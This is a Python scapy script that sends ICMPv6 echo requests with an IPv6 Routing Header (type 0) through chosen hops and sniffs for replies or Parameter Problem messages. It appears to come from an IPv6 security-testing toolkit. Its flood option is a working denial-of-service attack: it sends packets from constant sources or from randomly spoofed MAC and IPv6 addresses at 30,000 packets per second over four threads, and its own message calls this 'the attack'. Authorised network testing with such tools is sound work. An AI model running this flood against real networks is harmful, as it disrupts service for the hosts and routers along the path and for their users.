#! usr/bin/python
import argparse
import logging
import multiprocessing
import random
import sys
import threading
from collections import Counter

import netifaces
import netifaces as ni
from scapy.arch import get_if_hwaddr
from scapy.layers.inet6 import IPv6, IPv6ExtHdrRouting, ICMPv6EchoRequest, ICMPv6ParamProblem
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp, sendpfast, sniff
from scapy.volatile import RandShort
from validate_parameters import is_valid_ipv6, is_valid_port, payload, mac2ipv6
from validate_parameters import is_valid_mac
from validate_parameters import is_valid_num


def parameter():
    parser = argparse.ArgumentParser(description="Sending PING message(s) with Routing Header to a target, "
                                                 "with option to flood.")
    parser.add_argument("interface", nargs="?", help="the network interface to use from the sender")
    parser.add_argument("-smac", dest="source_mac", action="store",
                        help="the MAC address of sender (resolved from the interface if skipping)")
    parser.add_argument("-dmac", dest="destination_mac", action="store",
                        help="the MAC address of receiver (resolved from the interface if skipping).")
    parser.add_argument("-sip", dest="source_ip", action="store", help="the IPv6 address of sender (resolved from the"
                                                                       " interface if skipping)")
    parser.add_argument("-dip", dest="destination_ip", action="store", help="the IPv6 address of destination")
    parser.add_argument("-hop", dest="hops", nargs="+", default=[],
                        help="the IPv6 address of intermediate hop(s). Routing Header works when setting the target "
                             "as the last address in list of intermediate hops. (separated by space if more than 1)")
    parser.add_argument("-l", dest="data_length", type=int, action="store",
                        help="the size of data in bytes (32 bytes if skipping)")
    parser.add_argument("-f", dest="flood", action="store", choices=['constant', 'random'],
                        help="flood the targets with option: sending Routing header messages using only the defined "
                             "source addresses (constant), or sending Routing header messages with many random source "
                             "addresses (random)")
    args = parser.parse_args()

    # Validate the input
    if len(sys.argv) <= 1:
        parser.print_help()
        sys.exit(1)

    # Validate the network interface
    if not args.interface:
        print("---> Network interface is required!!!")
        parser.print_help()
        sys.exit(1)
    interface_list = netifaces.interfaces()
    while True:
        if args.interface in interface_list:
            break
        else:
            print("---> The given interface is invalid. Try again!!!")
            sys.exit(1)

    # Validate the source IPv6 address
    if args.source_ip is None:
        args.source_ip = ni.ifaddresses(args.interface)[ni.AF_INET6][0]['addr']
        args.source_ip = args.source_ip.replace("%", '')
        args.source_ip = args.source_ip.replace(args.interface, '')
    if args.source_ip is not None:
        if not is_valid_ipv6(args.source_ip):
            print("---> The given source IPv6 address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the destination IPv6 address
    if args.destination_ip is None:
        print("---> No destination IPv6 address is inserted. Try again!!!")
        sys.exit(1)
    if args.destination_ip is not None:
        if not is_valid_ipv6(args.destination_ip):
            print("---> The given destination IPv6 address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the source MAC address
    if args.source_mac is None:
        args.source_mac = get_if_hwaddr(args.interface)
    if args.source_mac is not None:
        if not is_valid_mac(args.source_mac):
            print("---> The given source MAC address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the destination MAC address
    if args.destination_mac is not None:
        if not is_valid_mac(args.destination_mac):
            print("---> The given destination MAC address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the intermediate hops
    if args.hops is None:
        args.hops = []
    if args.hops is not None:
        for i in range(len(args.hops)):
            if not is_valid_ipv6(args.hops[i]):
                print("---> The given IPv6 address of intermediate hop is invalid. Try again!!!")
                sys.exit(1)

    # Validate the size of Payload data
    if args.data_length is None:
        args.data_length = 32
    if args.data_length is not None:
        if not is_valid_port(args.data_length):
            print("---> The given size of data is invalid. Try again!!!")
            sys.exit(1)

    # Turning off logging
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

    return args.interface, args.source_mac, args.destination_mac, args.source_ip, args.destination_ip, args.hops, args.data_length, args.flood


def generate(interface, source_mac, destination_mac, source_ip, destination_ip, hops, data_length, flood):
    # Generate packet
    if destination_mac is None:
        layer2 = Ether(src=source_mac)
    if destination_mac is not None:
        layer2 = Ether(src=source_mac, dst=destination_mac)
    layer3 = IPv6(src=source_ip, dst=destination_ip, hlim=255)
    RH0 = IPv6ExtHdrRouting(addresses=hops)
    id = RandShort()
    data = payload(data_length)
    packet1 = layer2 / layer3 / RH0 / ICMPv6EchoRequest(id=id, seq=1, data=data)

    if flood is None:
        print("Sending Routing Header message to the destination: ", destination_ip)
        sendp(packet1, verbose=False, iface=interface)
    if flood is not None:
        pkt_list = []
        print("Flooding the every host on the way and target with Routing Header messages (press Ctrl+C to "
              "stop the attack).....")
        if flood == "constant":
            for i in range(200):
                pkt_list.append(packet1)
        if flood == "random":
            for i in range(150):
                random_mac = "02:01:00:%02x:%02x:%02x" % (random.randint(0, 255),
                                                          random.randint(0, 255),
                                                          random.randint(0, 255))
                M = 16 ** 4
                source_ip = "2001:dead:" + ":".join(("%x" % random.randint(0, M) for j in range(6)))
                layer2 = Ether(src=random_mac)
                layer3 = IPv6(src=source_ip, dst=destination_ip, hlim=255)
                packet1 = layer2 / layer3 / RH0 / ICMPv6EchoRequest(id=id, seq=1, data=data)
                pkt_list.append(packet1)

        def send_packets(packet, iface):
            try:
                sendpfast(packet, mbps=60000, pps=30000, loop=5000000, iface=iface)
            except KeyboardInterrupt:
                pass

        threads = []
        for i in range(4):
            thread = threading.Thread(target=send_packets, args=(pkt_list, interface))
            threads.append(thread)
            thread.start()

        # wait for all threads to complete
        for thread in threads:
            thread.join()


def sniffing(interface, source_ip, destination_ip, hops):
    # Define our Custom Action function
    ip_list = []

    def custom_action(packet):
        # Create tuple of Src/Dst in sorted order
        if packet[0][1].src not in ip_list:
            if hops:
                if packet[0][1].src == hops[-1] and packet[0][1].dst == source_ip:
                    print("===> Received Response message from IPv6 address: " + packet[0][1].src + " and MAC address: " + packet[0].src)
                    ip_list.append(packet[0][1].src)
            if not hops:
                if packet[0][1].src == destination_ip:
                    print("===> Received Response message from IPv6 address: " + packet[0][1].src + " and MAC address: " + packet[0].src)
                    print("     (Direct communication without defining intermediate hops)")
                    ip_list.append(packet[0][1].src)
            if ICMPv6ParamProblem in packet:
                print("===> Received Parameter Problem message from: " + packet[0][1].src + " and MAC address: " + packet[0].src)
                ip_list.append(packet[0][1].src)
            else:
                pass
    # Setup sniff, filtering for IP traffic to see the result
    build_filter = "ip6 dst %s" % source_ip

    try:
        sniff(iface=interface, filter=build_filter, prn=custom_action, timeout=2.5)
        if len(ip_list) < 1:
            print("===> No response found.")
    except KeyboardInterrupt:
        sys.exit(0)


def execute_functions(interface, source_mac, destination_mac, source_ip, destination_ip, hops, data_length, flood):
    p1 = multiprocessing.Process(target=generate, args=[interface, source_mac, destination_mac, source_ip, destination_ip, hops, data_length, flood])
    p2 = multiprocessing.Process(target=sniffing, args=[interface, source_ip, destination_ip, hops])
    p2.start()
    p1.start()
    p2.join()
    p1.join()


if __name__ == "__main__":
    interface, source_mac, destination_mac, source_ip, destination_ip, hops, data_length, flood = parameter()
    if flood is None:
        try:
            execute_functions(interface, source_mac, destination_mac, source_ip, destination_ip, hops, data_length, flood)
        except KeyboardInterrupt:
            sys.exit(0)
    else:
        try:
            generate(interface, source_mac, destination_mac, source_ip, destination_ip, hops, data_length, flood)
        except KeyboardInterrupt:
            # If KeyboardInterrupt is raised in the main thread, stop all child threads
            threading.Event().set()
            sys.exit(0)
